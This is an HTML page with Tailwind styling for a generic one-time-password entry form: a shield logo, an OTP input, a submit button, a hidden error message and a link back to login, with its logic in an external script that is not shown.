<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Time Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-gray-900 flex items-start md:items-center justify-center h-screen">

    <div class="w-full max-w-sm mx-auto bg-white shadow-lg rounded-lg p-8 mt-8 md:mt-0">

        <!-- Logo at the top center -->
        <div class="flex justify-center mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 50" width="40" height="50" fill="none"
                stroke="currentColor" stroke-width="2">
                <path d="M20 2L2 9v14c0 11 9 20 18 25 9-5 18-14 18-25V9L20 2z" fill="#2D9CDB" stroke="#1C75BC" />
                <path d="M20 5L4 11v11c0 10 7 17 16 22 9-5 16-12 16-22V11L20 5z" fill="white" stroke="#1C75BC" />
                <polyline points="14,25 18,29 28,19" fill="none" stroke="#1C75BC" stroke-width="2" />
            </svg>
        </div>

        <!-- Title Below the Logo -->
        <h2 class="text-center text-2xl font-bold text-gray-700 mb-6">One Time Password</h2>

        <!-- Forgot Username/Password Form -->
        <form id="otp-form" class="space-y-6">
            <!-- Hidden Error Message -->
      <div id="error-message" class="hidden mb-4 p-2 bg-red-100 text-red-700 rounded-md">
                <p>Error: Invalid OTP. Please try again.</p>
            </div>
            <!-- Email Input -->
            <div>
                <label for="otp" class="block text-sm font-medium text-gray-700">Enter your password</label>
                <input type="text" id="otp" name="otp" required placeholder="123456"
                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm">
            </div>

            <!-- Submit Button -->
            <div>
                <button type="submit"
                    class="w-full py-2 px-4 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2">
                    Submit
                </button>
            </div>

            <!-- Sign In Link -->
            <div class="mt-6 text-center">
                <p class="text-sm text-gray-600">
                    <a href="login" class="text-indigo-600 hover:text-indigo-500 font-medium">Back to login</a>
                </p>
            </div>
        </form>
    </div>
    <script src="otp.js"></script>
</body>

</html>
